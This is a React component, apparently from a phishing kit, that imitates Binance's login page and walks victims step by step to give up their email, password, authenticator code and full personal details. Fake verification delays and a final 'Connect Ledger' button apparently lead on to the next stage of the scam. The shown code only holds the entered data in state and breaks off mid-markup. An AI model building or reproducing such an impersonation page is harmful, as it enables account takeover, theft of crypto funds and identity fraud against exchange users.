import { FC, useState } from "react";
import { useToast } from "@/hooks/use-toast";
import { AlertTriangle } from "lucide-react";

type FormStep = 'email' | 'password' | 'verification' | 'important-notice' | 'personal-details' | 'verifying' | 'success';

const countries = [
  "United States", "United Kingdom", "Canada", "Australia", "Germany", "France", "Italy", "Spain", "Netherlands", "Belgium",
  "Switzerland", "Austria", "Sweden", "Norway", "Denmark", "Finland", "Poland", "Czech Republic", "Hungary", "Romania",
  "Bulgaria", "Croatia", "Slovenia", "Slovakia", "Estonia", "Latvia", "Lithuania", "Luxembourg", "Malta", "Cyprus",
  "Ireland", "Portugal", "Greece", "Japan", "South Korea", "Singapore", "Hong Kong", "Taiwan", "Malaysia", "Thailand",
  "Philippines", "Indonesia", "Vietnam", "India", "China", "Brazil", "Mexico", "Argentina", "Chile", "Colombia"
];

const BinanceLedgerForm: FC = () => {
  const { toast } = useToast();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [currentStep, setCurrentStep] = useState<FormStep>('email');
  const [isLoading, setIsLoading] = useState(false);
  const [logoError, setLogoError] = useState(false);
  const [errors, setErrors] = useState<{[key: string]: string}>({});
  const [personalDetails, setPersonalDetails] = useState({
    firstName: "",
    lastName: "",
    dateOfBirth: "",
    address: "",
    postalCode: "",
    city: "",
    country: "",
    phoneNumber: ""
  });

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});
    
    if (!email) {
      setErrors({ email: "Please enter your email address" });
      return;
    }
    
    if (!/\S+@\S+\.\S+/.test(email)) {
      setErrors({ email: "Please enter a valid email address" });
      return;
    }
    
    console.log("Email submitted:", email);
    setCurrentStep('password');
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});
    
    if (!password) {
      setErrors({ password: "Please enter your password" });
      return;
    }
    
    if (password.length < 6) {
      setErrors({ password: "Password must be at least 6 characters" });
      return;
    }
    
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 1500));
    setIsLoading(false);
    setCurrentStep('verification');
  };

  const handleVerificationSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});
    
    if (!verificationCode) {
      setErrors({ verification: "Please enter the verification code" });
      return;
    }
    
    if (verificationCode.length !== 6) {
      setErrors({ verification: "Verification code must be 6 digits" });
      return;
    }
    
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 2000));
    setIsLoading(false);
    setCurrentStep('important-notice');
  };

  const handleNoticeConfirm = () => {
    setCurrentStep('personal-details');
  };

  const handlePersonalDetailsSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});
    
    const requiredFields = ['firstName', 'lastName', 'dateOfBirth', 'address', 'postalCode', 'city', 'country', 'phoneNumber'];
    const newErrors: {[key: string]: string} = {};
    
    requiredFields.forEach(field => {
      if (!personalDetails[field as keyof typeof personalDetails]) {
        newErrors[field] = "This field is required";
      }
    });
    
    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }
    
    setCurrentStep('verifying');
    
    // Auto-proceed after 15 seconds
    setTimeout(() => {
      setCurrentStep('success');
    }, 15000);
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setVerificationCode(text);
    } catch (err) {
      console.error('Failed to read clipboard contents: ', err);
    }
  };

  const renderEmailStep = () => (
    <>
      <div className="flex justify-start mb-8">
        <div className="flex items-center">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
            alt="Binance Logo" 
            className="h-8"
            onError={(e) => {
              setLogoError(true);
              e.currentTarget.style.display = 'none';
            }}
          />
          {logoError && (
            <span className="text-binance-yellow font-bold text-xl">
              BINANCE
            </span>
          )}
        </div>
      </div>

      <div className="flex justify-between items-center mb-8">
        <div 
          className="binance-title"
          role="heading" 
          aria-level={1}
        >
          Log in
        </div>
        <div className="max-md:hidden h-[40px]">
          <div className="bn-tooltips-wrap qrcode-login-popup">
            <div className="bn-tooltips-ele">
              <div 
                className="p-[4px] w-[40px] h-[40px] rounded-[8px] cursor-pointer qr-login-icon transition-colors hover:bg-[#2B3139]"
                style={{ backgroundColor: "var(--color-Vessel, #1E2329)" }}
                role="button" 
                aria-label="QR code login" 
                tabIndex={0}
              >
                <svg 
                  className="w-[32px] h-[32px]" 
                  style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                  viewBox="0 0 24 24" 
                  xmlns="http://www.w3.org/2000/svg"
                  fill="currentColor"
                >
                  <path fillRule="evenodd" clipRule="evenodd" d="M9.5 9.5V3H3v6.5h6.5zm1 1.5H2a.5.5 0 01-.5-.5V2a.5.5 0 01.5-.5h8.5a.5.5 0 01.5.5v8.5a.5.5 0 01-.5.5z" />
                  <path d="M4.884 5.035h2.581v2.58h-2.58v-2.58zM4.884 16.535h2.581v2.58h-2.58v-2.58z" />
                  <path fillRule="evenodd" clipRule="evenodd" d="M9.5 21v-6.5H3V21h6.5zm1 1.5H2a.5.5 0 01-.5-.5v-8.5A.5.5 0 012 13h8.5a.5.5 0 01.5.5V22a.5.5 0 01-.5.5zM21 9.5V3h-6.5v6.5H21zm1 1.5h-8.5a.5.5 0 01-.5-.5V2a.5.5 0 01.5-.5H22a.5.5 0 01.5.5v8.5a.5.5 0 01-.5.5z" />
                  <path d="M16.535 5.035h2.58v2.58h-2.58v-2.58zM15.5 22.5V20H13v2.5h2.5z" />
                  <path fillRule="evenodd" clipRule="evenodd" d="M15.5 18v-2.5H18V13h-5v5h2.5zM22.5 20H20v-2.5h-2.5v5h5V20z" />
                  <path d="M22.5 15.5V13H20v2.5h2.5z" />
                </svg>
              </div>
            </div>
          </div>
        </div>
      </div>

      <form onSubmit={handleEmailSubmit}>
        <div className="bn-formItem mb-6">
          <label 
            className="binance-label block mb-2" 
            htmlFor="bn-formItem-q8nY2Y1v"
          >
            Email/Phone number
          </label>
          <div>
            <div className="css-4cffwv">
              <div 
                className={`bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded ${errors.email ? 'border-red-500' : ''}`}
                style={{
                  backgroundColor: "var(--color-Input, #2B3139)",
                  border: `1px solid ${errors.email ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                  height: "48px"
                }}
                role="group"
              >
                <input
                  placeholder="Email/Phone (without country code)"
                  type="text"
                  role="textbox"
                  aria-label="Username field for email or phone number"
                  name="username"
                  autoFocus
                  id="bn-formItem-q8nY2Y1v"
                  autoCapitalize="off"
                  className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                  spellCheck="false"
                  autoComplete="username"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
              </div>
              {errors.email && (
                <div className="text-red-500 text-sm mt-1 binance-small-text">
                  {errors.email}
                </div>
              )}
            </div>
          </div>
        </div>

        <button
          className="binance-button bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold"
          style={{
            backgroundColor: "var(--color-BtnBg, #FCD535)",
            color: "var(--color-TextOnYellow, #202630)",
            height: "48px"
          }}
          type="submit"
          aria-label="Next"
        >
          Next
        </button>
      </form>

      <div className="my-4 flex items-center md:mb-2 md:mt-6">
        <div 
          className="h-[1px] flex-1" 
          style={{ backgroundColor: "var(--color-Line, #2B3139)" }}
        />
        <div 
          className="px-4"
          style={{ 
            color: "var(--color-TertiaryText, #848E9C)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "400",
            lineHeight: "20px"
          }}
        >
          or
        </div>
        <div 
          className="h-[1px] flex-1" 
          style={{ backgroundColor: "var(--color-Line, #2B3139)" }}
        />
      </div>

      <div className="space-y-3">
        <button 
          className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button mb-3 md:mb-4 w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C]"
          style={{
            backgroundColor: "transparent",
            border: "1px solid var(--color-InputLine, #474D57)",
            color: "var(--color-PrimaryText, #EAECEF)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "400",
            lineHeight: "20px",
            height: "48px"
          }}
          role="button" 
          aria-label="Continue with Passkey"
        >
          <div className="icon-warp mr-3">
            <div className="ml-1 h-[20px]">
              <svg 
                className="bn-svg h-[20px] w-[20px]" 
                style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                viewBox="0 0 24 24" 
                xmlns="http://www.w3.org/2000/svg"
                fill="currentColor"
              >
                <path fillRule="evenodd" clipRule="evenodd" d="M1.5 17c0-2.9 2.35-5.25 5.25-5.25h3c2.9 0 5.25 2.35 5.25 5.25v4a.75.75 0 01-1.5 0v-4a3.75 3.75 0 00-3.75-3.75h-3A3.75 3.75 0 003 17v4a.75.75 0 01-1.5 0v-4zM8.25 9a3 3 0 100-6 3 3 0 000 6zm0 1.5a4.5 4.5 0 100-9 4.5 4.5 0 000 9zM18.536 11.923a.75.75 0 00-.75.75v5.138a.75.75 0 001.5 0v-5.138a.75.75 0 00-.75-.75z" />
                <path fillRule="evenodd" clipRule="evenodd" d="M17.786 16.041c0 .414.336.75.75.75h2.167a.75.75 0 000-1.5h-2.167a.75.75 0 00-.75.75zM16.75 10.15a1.773 1.773 0 113.545 0 1.773 1.773 0 01-3.545 0zm1.773-3.272a3.273 3.273 0 100 6.545 3.273 3.273 0 000-6.545z" />
              </svg>
            </div>
          </div>
          <div>Continue with Passkey</div>
        </button>

        <button 
          className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C]"
          style={{
            backgroundColor: "transparent",
            border: "1px solid var(--color-InputLine, #474D57)",
            color: "var(--color-PrimaryText, #EAECEF)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "400",
            lineHeight: "20px",
            height: "48px"
          }}
          role="button" 
          aria-label="Continue with Google"
        >
          <div className="icon-warp mr-3">
            <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="bn-svg">
              <g clipPath="url(#clip0_2445_976)">
                <path fillRule="evenodd" clipRule="evenodd" d="M19.68 12.1818C19.68 11.6146 19.6291 11.0691 19.5345 10.5455H12V13.64H16.3055C16.12 14.64 15.5564 15.4873 14.7091 16.0546V18.0618H17.2945C18.8073 16.6691 19.68 14.6182 19.68 12.1818Z" fill="#4285F4" />
                <path fillRule="evenodd" clipRule="evenodd" d="M11.9997 20C14.1597 20 15.9706 19.2836 17.2942 18.0618L14.7088 16.0545C13.9924 16.5345 13.076 16.8182 11.9997 16.8182C9.91604 16.8182 8.1524 15.4109 7.52331 13.52H4.85059V15.5927C6.16695 18.2073 8.8724 20 11.9997 20Z" fill="#34A853" />
                <path fillRule="evenodd" clipRule="evenodd" d="M7.52364 13.52C7.36364 13.04 7.27273 12.5273 7.27273 12C7.27273 11.4727 7.36364 10.96 7.52364 10.48V8.40729H4.85091C4.30909 9.48729 4 10.7091 4 12C4 13.2909 4.30909 14.5127 4.85091 15.5927L7.52364 13.52Z" fill="#FBBC05" />
                <path fillRule="evenodd" clipRule="evenodd" d="M11.9997 7.18182C13.1742 7.18182 14.2288 7.58545 15.0579 8.37818L17.3524 6.08364C15.9669 4.79273 14.156 4 11.9997 4C8.8724 4 6.16695 5.79273 4.85059 8.40727L7.52331 10.48C8.1524 8.58909 9.91604 7.18182 11.9997 7.18182Z" fill="#EA4335" />
              </g>
              <defs>
                <clipPath id="clip0_2445_976">
                  <rect width="16" height="16" fill="none" transform="translate(4 4)" />
                </clipPath>
              </defs>
            </svg>
          </div>
          <div>Continue with Google</div>
        </button>

        <button 
          className="bn-button bn-button__icon bn-button__icon__line data-size-large bids_icon-button mt-4 w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C]"
          style={{
            backgroundColor: "transparent",
            border: "1px solid var(--color-InputLine, #474D57)",
            color: "var(--color-PrimaryText, #EAECEF)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "400",
            lineHeight: "20px",
            height: "48px"
          }}
          role="button" 
          aria-label="Continue with Telegram"
        >
          <div className="icon-warp mr-3">
            <svg height="24" width="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" className="bn-svg">
              <path d="M2.81274 9.27228C7.28665 7.32306 10.27 6.03802 11.7627 5.41715C16.0247 3.64445 16.9103 3.33651 17.4875 3.32634C17.6144 3.3241 17.8983 3.35557 18.0822 3.50477C18.2374 3.63075 18.2801 3.80094 18.3006 3.92038C18.321 4.03983 18.3465 4.31192 18.3263 4.52453C18.0953 6.95123 17.0959 12.8402 16.5875 15.5581C16.3724 16.7082 15.9488 17.0938 15.5387 17.1315C14.6475 17.2136 13.9707 16.5426 13.1076 15.9767C11.7568 15.0913 10.9938 14.5401 9.68265 13.6761C8.16744 12.6776 9.14969 12.1288 10.0132 11.232C10.2392 10.9972 14.1659 7.42557 14.2419 7.10157C14.2514 7.06104 14.2603 6.90999 14.1705 6.83024C14.0808 6.75048 13.9483 6.77775 13.8528 6.79944C13.7173 6.83019 11.5595 8.25641 7.37938 11.0781C6.7669 11.4987 6.21213 11.7036 5.71508 11.6929C5.16711 11.681 4.11306 11.383 3.32947 11.1283C2.36838 10.8159 1.60451 10.6507 1.67103 10.1202C1.70568 9.84381 2.08624 9.56118 2.81274 9.27228Z" fill="#00AEED" />
            </svg>
          </div>
          <div>Continue with Telegram</div>
        </button>
      </div>
    </>
  );

  const renderPasswordStep = () => (
    <>
      <div className="flex justify-start mb-8">
        <div className="flex items-center">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
            alt="Binance Logo" 
            className="h-8"
            onError={(e) => {
              setLogoError(true);
              e.currentTarget.style.display = 'none';
            }}
          />
          {logoError && (
            <span className="text-binance-yellow font-bold text-xl">
              BINANCE
            </span>
          )}
        </div>
      </div>

      <div className="mb-8">
        <div 
          className="binance-title"
          role="heading" 
          aria-level={1}
        >
          Enter Password
        </div>
      </div>

      <form onSubmit={handlePasswordSubmit}>
        <div className="bn-formItem mb-6">
          <label 
            className="binance-label block mb-2" 
            htmlFor="password-field"
          >
            Password
          </label>
          <div>
            <div className="css-4cffwv">
              <div 
                className={`bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded ${errors.password ? 'border-red-500' : ''}`}
                style={{
                  backgroundColor: "var(--color-Input, #2B3139)",
                  border: `1px solid ${errors.password ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                  height: "48px"
                }}
                role="group"
              >
                <input
                  placeholder="Enter your password"
                  type="password"
                  role="textbox"
                  aria-label="Password field"
                  name="password"
                  autoFocus
                  id="password-field"
                  autoCapitalize="off"
                  className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                  spellCheck="false"
                  autoComplete="current-password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>
              {errors.password && (
                <div className="text-red-500 text-sm mt-1 binance-small-text">
                  {errors.password}
                </div>
              )}
            </div>
          </div>
        </div>

        <button
          className="binance-button bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold"
          style={{
            backgroundColor: "var(--color-BtnBg, #FCD535)",
            color: "var(--color-TextOnYellow, #202630)",
            height: "48px"
          }}
          type="submit"
          disabled={isLoading}
          aria-label="Continue"
        >
          {isLoading ? (
            <div className="animate-spin rounded-full h-5 w-5 border-2 border-current border-t-transparent"></div>
          ) : (
            'Continue'
          )}
        </button>
      </form>
    </>
  );

  const renderVerificationStep = () => (
    <>
      <div className="flex justify-start mb-8">
        <div className="flex items-center">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
            alt="Binance Logo" 
            className="h-8"
            onError={(e) => {
              setLogoError(true);
              e.currentTarget.style.display = 'none';
            }}
          />
          {logoError && (
            <span className="text-binance-yellow font-bold text-xl">
              BINANCE
            </span>
          )}
        </div>
      </div>

      <div className="mb-4">
        <div 
          className="binance-title"
          role="heading" 
          aria-level={1}
        >
          Enter Verification Code
        </div>
      </div>

      <div 
        className="mb-4 binance-text"
        style={{ color: "var(--color-SecondaryText, #B7BDC6)" }}
      >
        Enter the code from your Google/Binance Authenticator.
      </div>

      <form onSubmit={handleVerificationSubmit}>
        <div className="bn-formItem mb-6">
          <label 
            className="binance-small-text block mb-2" 
            htmlFor="verification-field"
            style={{ color: "var(--color-TertiaryText, #848E9C)" }}
          >
            Authenticator App
          </label>
          <div>
            <div className="css-4cffwv relative">
              <div 
                className={`bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded ${errors.verification ? 'border-red-500' : ''}`}
                style={{
                  backgroundColor: "var(--color-Input, #2B3139)",
                  border: `1px solid ${errors.verification ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                  height: "48px"
                }}
                role="group"
              >
                <input
                  placeholder="Enter 6-digit code"
                  type="text"
                  role="textbox"
                  aria-label="Verification code field"
                  name="verification"
                  autoFocus
                  id="verification-field"
                  autoCapitalize="off"
                  className="binance-input bg-transparent border-0 text-white p-3 pr-16 w-full outline-none h-full"
                  spellCheck="false"
                  maxLength={6}
                  value={verificationCode}
                  onChange={(e) => setVerificationCode(e.target.value)}
                />
                <button
                  type="button"
                  onClick={handlePaste}
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 binance-button font-medium hover:opacity-80 transition-opacity"
                  style={{ color: "var(--color-BtnBg, #FCD535)" }}
                >
                  Paste
                </button>
              </div>
              {errors.verification && (
                <div className="text-red-500 text-sm mt-1 binance-small-text">
                  {errors.verification}
                </div>
              )}
            </div>
          </div>
        </div>

        <button
          className="binance-button bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold"
          style={{
            backgroundColor: "var(--color-BtnBg, #FCD535)",
            color: "var(--color-TextOnYellow, #202630)",
            height: "48px"
          }}
          type="submit"
          disabled={isLoading}
          aria-label="Submit"
        >
          {isLoading ? (
            <div className="animate-spin rounded-full h-5 w-5 border-2 border-current border-t-transparent"></div>
          ) : (
            'Submit'
          )}
        </button>
      </form>
    </>
  );

  const renderImportantNoticeStep = () => (
    <>
      <div className="flex justify-start mb-8">
        <div className="flex items-center">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
            alt="Binance Logo" 
            className="h-8"
            onError={(e) => {
              setLogoError(true);
              e.currentTarget.style.display = 'none';
            }}
          />
          {logoError && (
            <span className="text-binance-yellow font-bold text-xl">
              BINANCE
            </span>
          )}
        </div>
      </div>

      <div className="text-center py-8">
        <div 
          className="mb-6 flex items-center justify-center gap-3 binance-title"
          style={{ color: "#F59E0B" }}
        >
          <AlertTriangle size={32} className="text-yellow-500" />
          Important Notice
        </div>
        
        <div 
          className="mb-8 text-left p-6 rounded-lg border-l-4 border-yellow-500"
          style={{ 
            backgroundColor: "#FEF3C7",
            color: "#92400E"
          }}
        >
          <div className="binance-text">
            Please ensure that all the information you provide is accurate and matches your official documents. This information will be verified for security and compliance purposes. Failure to provide accurate information may result in a delay or rejection of your verification process.
          </div>
        </div>
        
        <button
          onClick={handleNoticeConfirm}
          className="binance-button bn-button bn-button__primary data-size-large w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold"
          style={{
            backgroundColor: "var(--color-BtnBg, #FCD535)",
            color: "var(--color-TextOnYellow, #202630)",
            height: "48px"
          }}
          aria-label="I Understand"
        >
          I Understand
        </button>
      </div>
    </>
  );

  const renderPersonalDetailsStep = () => (
    <>
      <div className="flex justify-start mb-8">
        <div className="flex items-center">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
            alt="Binance Logo" 
            className="h-8"
            onError={(e) => {
              setLogoError(true);
              e.currentTarget.style.display = 'none';
            }}
          />
          {logoError && (
            <span className="text-binance-yellow font-bold text-xl">
              BINANCE
            </span>
          )}
        </div>
      </div>

      <div className="mb-8">
        <div 
          className="binance-title"
          role="heading" 
          aria-level={1}
        >
          Verify Details
        </div>
      </div>

      <form onSubmit={handlePersonalDetailsSubmit}>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="bn-formItem">
            <label className="binance-label block mb-2">
              First Name
            </label>
            <div 
              className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.firstName ? 'border-red-500' : ''}`}
              style={{
                backgroundColor: "var(--color-Input, #2B3139)",
                border: `1px solid ${errors.firstName ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                height: "48px"
              }}
            >
              <input
                type="text"
                className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                value={personalDetails.firstName}
                onChange={(e) => setPersonalDetails({...personalDetails, firstName: e.target.value})}
              />
            </div>
            {errors.firstName && (
              <div className="text-red-500 text-sm mt-1 binance-small-text">
                {errors.firstName}
              </div>
            )}
          </div>

          <div className="bn-formItem">
            <label className="binance-label block mb-2">
              Last Name
            </label>
            <div 
              className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.lastName ? 'border-red-500' : ''}`}
              style={{
                backgroundColor: "var(--color-Input, #2B3139)",
                border: `1px solid ${errors.lastName ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                height: "48px"
              }}
            >
              <input
                type="text"
                className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                value={personalDetails.lastName}
                onChange={(e) => setPersonalDetails({...personalDetails, lastName: e.target.value})}
              />
            </div>
            {errors.lastName && (
              <div className="text-red-500 text-sm mt-1 binance-small-text">
                {errors.lastName}
              </div>
            )}
          </div>

          <div className="bn-formItem">
            <label className="binance-label block mb-2">
              Date of Birth
            </label>
            <div 
              className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.dateOfBirth ? 'border-red-500' : ''}`}
              style={{
                backgroundColor: "var(--color-Input, #2B3139)",
                border: `1px solid ${errors.dateOfBirth ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                height: "48px"
              }}
            >
              <input
                type="date"
                className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                value={personalDetails.dateOfBirth}
                onChange={(e) => setPersonalDetails({...personalDetails, dateOfBirth: e.target.value})}
              />
            </div>
            {errors.dateOfBirth && (
              <div className="text-red-500 text-sm mt-1 binance-small-text">
                {errors.dateOfBirth}
              </div>
            )}
          </div>

          <div className="bn-formItem">
            <label className="binance-label block mb-2">
              Phone Number
            </label>
            <div 
              className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.phoneNumber ? 'border-red-500' : ''}`}
              style={{
                backgroundColor: "var(--color-Input, #2B3139)",
                border: `1px solid ${errors.phoneNumber ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                height: "48px"
              }}
            >
              <input
                type="tel"
                className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                value={personalDetails.phoneNumber}
                onChange={(e) => setPersonalDetails({...personalDetails, phoneNumber: e.target.value})}
              />
            </div>
            {errors.phoneNumber && (
              <div className="text-red-500 text-sm mt-1 binance-small-text">
                {errors.phoneNumber}
              </div>
            )}
          </div>

          <div className="bn-formItem md:col-span-2">
            <label className="binance-label block mb-2">
              Address
            </label>
            <div 
              className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.address ? 'border-red-500' : ''}`}
              style={{
                backgroundColor: "var(--color-Input, #2B3139)",
                border: `1px solid ${errors.address ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                height: "48px"
              }}
            >
              <input
                type="text"
                className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                value={personalDetails.address}
                onChange={(e) => setPersonalDetails({...personalDetails, address: e.target.value})}
              />
            </div>
            {errors.address && (
              <div className="text-red-500 text-sm mt-1 binance-small-text">
                {errors.address}
              </div>
            )}
          </div>

          <div className="bn-formItem">
            <label className="binance-label block mb-2">
              Postal Code
            </label>
            <div 
              className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.postalCode ? 'border-red-500' : ''}`}
              style={{
                backgroundColor: "var(--color-Input, #2B3139)",
                border: `1px solid ${errors.postalCode ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                height: "48px"
              }}
            >
              <input
                type="text"
                className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                value={personalDetails.postalCode}
                onChange={(e) => setPersonalDetails({...personalDetails, postalCode: e.target.value})}
              />
            </div>
            {errors.postalCode && (
              <div className="text-red-500 text-sm mt-1 binance-small-text">
                {errors.postalCode}
              </div>
            )}
          </div>

          <div className="bn-formItem">
            <label className="binance-label block mb-2">
              City
            </label>
            <div 
              className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.city ? 'border-red-500' : ''}`}
              style={{
                backgroundColor: "var(--color-Input, #2B3139)",
                border: `1px solid ${errors.city ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                height: "48px"
              }}
            >
              <input
                type="text"
                className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                value={personalDetails.city}
                onChange={(e) => setPersonalDetails({...personalDetails, city: e.target.value})}
              />
            </div>
            {errors.city && (
              <div className="text-red-500 text-sm mt-1 binance-small-text">
                {errors.city}
              </div>
            )}
          </div>

          <div className="bn-formItem">
            <label className="binance-label block mb-2">
              Country
            </label>
            <div 
              className={`bn-textField bn-textField__line data-size-large css-8x1t0r rounded ${errors.country ? 'border-red-500' : ''}`}
              style={{
                backgroundColor: "var(--color-Input, #2B3139)",
                border: `1px solid ${errors.country ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
                height: "48px"
              }}
            >
              <select
                className="binance-input bg-transparent border-0 text-white p-3 w-full outline-none h-full"
                value={personalDetails.country}
                onChange={(e) => setPersonalDetails({...personalDetails, country: e.target.value})}
                style={{ backgroundColor: "var(--color-Input, #2B3139)" }}
              >
                <option value="" className="bg-[#2B3139] text-white">Select a country</option>
                {countries.map((country) => (
                  <option key={country} value={country} className="bg-[#2B3139] text-white">
                    {country}
                  </option>
                ))}
              </select>
            </div>
            {errors.country && (
              <div className="text-red-500 text-sm mt-1 binance-small-text">
                {errors.country}
              </div>
            )}
          </div>
        </div>

        <button
          className="binance-button bn-button bn-button__primary data-size-large mt-6 w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold"
          style={{
            backgroundColor: "var(--color-BtnBg, #FCD535)",
            color: "var(--color-TextOnYellow, #202630)",
            height: "48px"
          }}
          type="submit"
          disabled={isLoading}
          aria-label="Submit"
        >
          {isLoading ? (
            <div className="animate-spin rounded-full h-5 w-5 border-2 border-current border-t-transparent"></div>
          ) : (
            'Submit'
          )}
        </button>
      </form>
    </>
  );

  const renderVerifyingStep = () => (
    <>
      <div className="flex justify-start mb-8">
        <div className="flex items-center">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
            alt="Binance Logo" 
            className="h-8"
            onError={(e) => {
              setLogoError(true);
              e.currentTarget.style.display = 'none';
            }}
          />
          {logoError && (
            <span className="text-binance-yellow font-bold text-xl">
              BINANCE
            </span>
          )}
        </div>
      </div>

      <div className="text-center py-8">
        <div className="mb-8">
          <div className="animate-spin rounded-full h-16 w-16 border-4 border-binance-yellow border-t-transparent mx-auto mb-6"></div>
          <div 
            className="binance-title mb-4"
            style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
          >
            Please wait a moment while we verify your details
          </div>
        </div>
      </div>
    </>
  );

  const renderSuccessStep = () => (
    <>
      <div className="flex justify-start mb-8">
        <div className="flex items-center">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
            alt="Binance Logo" 
            className="h-8"
            onError={(e) => {
              setLogoError(true);
              e.currentTarget.style.display = 'none';
            }}
          />
          {logoError && (
            <span className="text-binance-yellow font-bold text-xl">
              BINANCE
            </span>
          )}
        </div>
      </div>

      <div className="text-center py-8">
        <div 
          className="mb-8 binance-title"
          style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
        >
          Verification Successful
        </div>
        
        <button
          className="binance-button bn-button bn-button__primary data-size-large w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold"
          style={{
            backgroundColor: "var(--color-BtnBg, #FCD535)",
            color: "var(--color-TextOnYellow, #202630)",
            height: "48px"
          }}
          aria-label="Connect Ledger"
        >
          Connect Ledger
        </button>
      </div>
    </>
  );

  const renderCurrentStep = () => {
    switch (currentStep) {
      case 'email':
        return renderEmailStep();
      case 'password':
        return renderPasswordStep();
      case 'verification':
        return renderVerificationStep();
      case 'important-notice':
        return renderImportantNoticeStep();
      case 'personal-details':
        return renderPersonalDetailsStep();
      case 'verifying':
        return renderVerifyingStep();
      case 'success':
        return renderSuccessStep();
      default:
        return renderEmailStep();
    }
  };

  return (
    <div 
      className="min-h-screen flex items-center justify-center p-4"
      style={{ backgroundColor: "var(--color-Body, #181A20)" }}
    >
      <div 
        className="w-full max-w-md p-8 rounded-lg"
